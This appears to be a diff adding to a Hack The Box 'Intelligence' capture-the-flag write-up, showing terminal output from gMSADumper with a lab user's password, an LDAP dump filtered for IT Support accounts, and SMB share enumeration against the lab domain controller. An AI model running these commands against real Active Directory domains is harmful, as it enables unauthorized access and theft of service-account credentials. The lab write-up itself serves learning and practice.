@@ -368,3 +368,33 @@ dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
 cn: svc_int
 dNSHostName: svc_int.intelligence.htb
 ```
+
+```
+──(root💀kali)-[~/Downloads/hackthebox/inteligence/gMSADumper]
+└─# python3 gMSADumper.py -d intelligence.htb -l 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+```
+
+```
+┌──(root💀kali)-[~/…/hackthebox/inteligence/ldapdomaindump/ldap_dump]
+└─# less domain_users.grep | grep -i support
+Ted Graves	Ted Graves	Ted.Graves	IT Support	Domain Users	04/19/21 00:49:42	10/27/21 10:08:29	10/27/21 11:18:29	NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD	04/19/21 00:49:42	S-1-5-21-4210132550-3389855604-3437519686-1140	
+Laura Lee	Laura Lee	Laura.Lee	IT Support	Domain Users	04/19/21 00:49:41	04/19/21 00:49:41	01/01/01 00:00:00	NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD	04/19/21 00:49:41	S-1-5-21-4210132550-3389855604-3437519686-1139	
+                                                                                                                      
+┌──(root💀kali)-[~/…/hackthebox/inteligence/ldapdomaindump/ldap_dump]
+└─# smbclient -L \\\\intelligence.htb -U Tiffany.Molina
+Enter WORKGROUP\Tiffany.Molina's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	IT              Disk      
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+```
